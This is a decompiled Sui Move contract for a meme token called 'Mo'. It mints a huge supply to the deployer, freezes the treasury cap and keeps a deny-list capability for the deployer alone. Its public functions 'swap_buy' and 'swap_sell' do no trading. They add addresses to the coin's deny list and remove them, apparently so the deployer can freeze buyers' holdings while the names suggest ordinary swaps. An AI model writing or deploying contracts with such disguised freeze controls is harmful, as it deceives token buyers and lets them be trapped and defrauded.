module 0xe0161e90d6fb2f790f8ff67e5de7cf6a5e8b9ef33e8bfe2cb36b3f69a390d921::mo {
    struct MO has drop {
        dummy_field: bool,
    }

    struct CapWrapper has key {
        id: 0x2::object::UID,
    }

    fun init(arg0: MO, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<MO>(arg0, 9, b"Mo", b"Mooooooooooooo coin", b"", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://ipfs.io/ipfs/QmPeKytaaa96GGozHBJjxXQD5kjh7JGZBctn5vaoHZ24Wz"))), false, arg1);
        let v3 = v0;
        0x2::coin::mint_and_transfer<MO>(&mut v3, 690000000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<MO>>(v2);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<MO>>(v3);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<MO>>(v1, 0x2::tx_context::sender(arg1));
    }

    public fun swap_buy(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<MO>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<MO>(arg0, arg1, arg2, arg3);
    }

    public fun swap_sell(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<MO>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_remove<MO>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

